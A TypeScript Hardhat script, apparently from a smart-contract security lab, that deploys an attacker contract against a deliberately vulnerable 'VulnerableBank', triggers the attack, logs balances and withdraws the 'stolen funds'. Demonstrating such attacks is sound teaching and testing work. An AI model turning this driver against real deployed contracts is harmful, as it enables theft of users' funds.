import { ethers } from "hardhat";
import { VulnerableBank } from "../typechain-types/contracts/VulnerableBank";
import { VulnerableBank__factory } from "../typechain-types/factories/contracts/VulnerableBank__factory";
import { AttackerContract__factory } from "../typechain-types";
import dotenv from 'dotenv';

dotenv.config();

async function main() {
  const vulnerableBankAddress = process.env.CONTRACT_ADDRESS;
  if (!vulnerableBankAddress) {
    console.error('VulnerableBank contract address not found');
    return;
  }
  console.log("VulnerableBank address:", vulnerableBankAddress);

  const AttackerContractFactory = await ethers.getContractFactory("AttackerContract") as AttackerContract__factory;
  const attackerContract = await AttackerContractFactory.deploy(vulnerableBankAddress);
  await attackerContract.waitForDeployment();
  console.log("AttackerContract deployed to:", await attackerContract.getAddress());

  // Get a signer to perform the attack
  const [attacker] = await ethers.getSigners();

  // Get the VulnerableBank instance
  const vulnerableBank: VulnerableBank = VulnerableBank__factory.connect(vulnerableBankAddress, ethers.provider);

  // Fund the VulnerableBank (if needed)
  await vulnerableBank.connect(attacker).deposit({ value: ethers.parseEther("5") });
  console.log("VulnerableBank funded with 5 ETH");

  // Perform the attack
  console.log("Initiating attack...");
  const attackTx = await attackerContract.connect(attacker).attack({ value: ethers.parseEther("1") });
  await attackTx.wait();
  console.log("Attack transaction sent:", attackTx.hash);

  // Check balances after attack
  const attackerBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
  const bankBalance = await ethers.provider.getBalance(vulnerableBankAddress);

  console.log("Attacker Contract balance after attack:", ethers.formatEther(attackerBalance), "ETH");
  console.log("VulnerableBank balance after attack:", ethers.formatEther(bankBalance), "ETH");

  // Withdraw stolen funds
  const withdrawTx = await attackerContract.connect(attacker).withdrawStolenFunds();
  await withdrawTx.wait();
  console.log("Stolen funds withdrawn to attacker's address");

  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  console.log("Attacker's final balance:", ethers.formatEther(finalAttackerBalance), "ETH");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});